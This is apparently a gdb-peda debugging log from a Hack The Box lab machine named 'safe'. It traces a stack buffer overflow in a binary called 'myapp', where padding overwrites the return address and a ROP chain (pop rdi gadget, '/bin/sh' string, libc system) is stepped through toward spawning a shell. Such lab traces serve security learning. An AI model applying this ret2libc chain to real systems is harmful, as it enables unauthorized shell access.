```
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7af4154 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7dd18c0 --> 0x0 
RSI: 0x405260 ("What do you want me to echo back? ", 'A' <repeats 120 times>, "\v\022@\n")
RDI: 0x1 
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffdd98 --> 0x40120b (<__libc_csu_init+91>:	pop    rdi)
RIP: 0x4011ac (<main+77>:	ret)
R8 : 0x7ffff7fda4c0 (0x00007ffff7fda4c0)
R9 : 0x0 
R10: 0x3 
R11: 0x246 
R12: 0x401070 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffde70 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011a1 <main+66>:	call   0x401030 <puts@plt>
   0x4011a6 <main+71>:	mov    eax,0x0
   0x4011ab <main+76>:	leave  
=> 0x4011ac <main+77>:	ret    
   0x4011ad:	nop    DWORD PTR [rax]
   0x4011b0 <__libc_csu_init>:	push   r15
   0x4011b2 <__libc_csu_init+2>:	mov    r15,rdx
   0x4011b5 <__libc_csu_init+5>:	push   r14
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd98 --> 0x40120b (<__libc_csu_init+91>:	pop    rdi)
0008| 0x7fffffffdda0 --> 0x7ffff7b97e9a --> 0x68732f6e69622f ('/bin/sh')
0016| 0x7fffffffdda8 --> 0x7ffff7a33440 (<__libc_system>:	test   rdi,rdi)
0024| 0x7fffffffddb0 --> 0x100008000 
0032| 0x7fffffffddb8 --> 0x40115f (<main>:	push   rbp)
0040| 0x7fffffffddc0 --> 0x0 
0048| 0x7fffffffddc8 --> 0x65b52888ff1cfe86 
0056| 0x7fffffffddd0 --> 0x401070 (<_start>:	xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x00000000004011ac in main ()
gdb-peda$ si

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7af4154 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7dd18c0 --> 0x0 
RSI: 0x405260 ("What do you want me to echo back? ", 'A' <repeats 120 times>, "\v\022@\n")
RDI: 0x1 
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffdda0 --> 0x7ffff7b97e9a --> 0x68732f6e69622f ('/bin/sh')
RIP: 0x40120b (<__libc_csu_init+91>:	pop    rdi)
R8 : 0x7ffff7fda4c0 (0x00007ffff7fda4c0)
R9 : 0x0 
R10: 0x3 
R11: 0x246 
R12: 0x401070 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffde70 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0x40120b <__libc_csu_init+91>:	pop    rdi
   0x40120c <__libc_csu_init+92>:	ret    
   0x40120d:	nop    DWORD PTR [rax]
   0x401210 <__libc_csu_fini>:	ret
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdda0 --> 0x7ffff7b97e9a --> 0x68732f6e69622f ('/bin/sh')
0008| 0x7fffffffdda8 --> 0x7ffff7a33440 (<__libc_system>:	test   rdi,rdi)
0016| 0x7fffffffddb0 --> 0x100008000 
0024| 0x7fffffffddb8 --> 0x40115f (<main>:	push   rbp)
0032| 0x7fffffffddc0 --> 0x0 
0040| 0x7fffffffddc8 --> 0x65b52888ff1cfe86 
0048| 0x7fffffffddd0 --> 0x401070 (<_start>:	xor    ebp,ebp)
0056| 0x7fffffffddd8 --> 0x7fffffffde70 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000040120b in __libc_csu_init ()
gdb-peda$ si

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7af4154 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7dd18c0 --> 0x0 
RSI: 0x405260 ("What do you want me to echo back? ", 'A' <repeats 120 times>, "\v\022@\n")
RDI: 0x7ffff7b97e9a --> 0x68732f6e69622f ('/bin/sh')
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffdda8 --> 0x7ffff7a33440 (<__libc_system>:	test   rdi,rdi)
RIP: 0x40120c (<__libc_csu_init+92>:	ret)
R8 : 0x7ffff7fda4c0 (0x00007ffff7fda4c0)
R9 : 0x0 
R10: 0x3 
R11: 0x246 
R12: 0x401070 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffde70 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401206 <__libc_csu_init+86>:	pop    r13
   0x401208 <__libc_csu_init+88>:	pop    r14
   0x40120a <__libc_csu_init+90>:	pop    r15
=> 0x40120c <__libc_csu_init+92>:	ret    
   0x40120d:	nop    DWORD PTR [rax]
   0x401210 <__libc_csu_fini>:	ret    
   0x401211:	add    BYTE PTR [rax],al
   0x401213:	add    BYTE PTR [rax-0x7d],cl
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdda8 --> 0x7ffff7a33440 (<__libc_system>:	test   rdi,rdi)
0008| 0x7fffffffddb0 --> 0x100008000 
0016| 0x7fffffffddb8 --> 0x40115f (<main>:	push   rbp)
0024| 0x7fffffffddc0 --> 0x0 
0032| 0x7fffffffddc8 --> 0x65b52888ff1cfe86 
0040| 0x7fffffffddd0 --> 0x401070 (<_start>:	xor    ebp,ebp)
0048| 0x7fffffffddd8 --> 0x7fffffffde70 --> 0x1 
0056| 0x7fffffffdde0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000040120c in __libc_csu_init ()
gdb-peda$ si

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7af4154 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7dd18c0 --> 0x0 
RSI: 0x405260 ("What do you want me to echo back? ", 'A' <repeats 120 times>, "\v\022@\n")
RDI: 0x7ffff7b97e9a --> 0x68732f6e69622f ('/bin/sh')
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffddb0 --> 0x100008000 
RIP: 0x7ffff7a33440 (<__libc_system>:	test   rdi,rdi)
R8 : 0x7ffff7fda4c0 (0x00007ffff7fda4c0)
R9 : 0x0 
R10: 0x3 
R11: 0x246 
R12: 0x401070 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffde70 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7a33439 <cancel_handler+217>:	pop    rbx
   0x7ffff7a3343a <cancel_handler+218>:	ret    
   0x7ffff7a3343b:	nop    DWORD PTR [rax+rax*1+0x0]
=> 0x7ffff7a33440 <__libc_system>:	test   rdi,rdi
   0x7ffff7a33443 <__libc_system+3>:	je     0x7ffff7a33450 <__libc_system+16>
   0x7ffff7a33445 <__libc_system+5>:	jmp    0x7ffff7a32eb0 <do_system>
   0x7ffff7a3344a <__libc_system+10>:	nop    WORD PTR [rax+rax*1+0x0]
   0x7ffff7a33450 <__libc_system+16>:	lea    rdi,[rip+0x164a4b]        # 0x7ffff7b97ea2
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddb0 --> 0x100008000 
0008| 0x7fffffffddb8 --> 0x40115f (<main>:	push   rbp)
0016| 0x7fffffffddc0 --> 0x0 
0024| 0x7fffffffddc8 --> 0x65b52888ff1cfe86 
0032| 0x7fffffffddd0 --> 0x401070 (<_start>:	xor    ebp,ebp)
0040| 0x7fffffffddd8 --> 0x7fffffffde70 --> 0x1 
0048| 0x7fffffffdde0 --> 0x0 
0056| 0x7fffffffdde8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
__libc_system (line=0x7ffff7b97e9a "/bin/sh") at ../sysdeps/posix/system.c:180
180	../sysdeps/posix/system.c: No such file or directory.
gdb-peda$ c
Continuing.

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0xb ('\x0b')
RBX: 0x0 
RCX: 0x0 
RDX: 0x0 
RSI: 0x7fffffffdc78 --> 0x0 
RDI: 0x2 
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffddb8 --> 0x40115f (<main>:	push   rbp)
RIP: 0x100008000 
R8 : 0x0 
R9 : 0x0 
R10: 0x8 
R11: 0x246 
R12: 0x401070 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffde70 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x100008000
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddb8 --> 0x40115f (<main>:	push   rbp)
0008| 0x7fffffffddc0 --> 0x0 
0016| 0x7fffffffddc8 --> 0x65b52888ff1cfe86 
0024| 0x7fffffffddd0 --> 0x401070 (<_start>:	xor    ebp,ebp)
0032| 0x7fffffffddd8 --> 0x7fffffffde70 --> 0x1 
0040| 0x7fffffffdde0 --> 0x0 
0048| 0x7fffffffdde8 --> 0x0 
0056| 0x7fffffffddf0 --> 0x9a4ad7f7673cfe86 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000100008000 in ?? ()
gdb-peda$ q
sckull@tars:~/hackthebox/safe$ (cat in.txt ; cat) | ./myapp 
 00:17:00 up  2:48,  1 user,  load average: 0.78, 0.65, 0.64

id   
What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
                  @

Segmentation fault
```
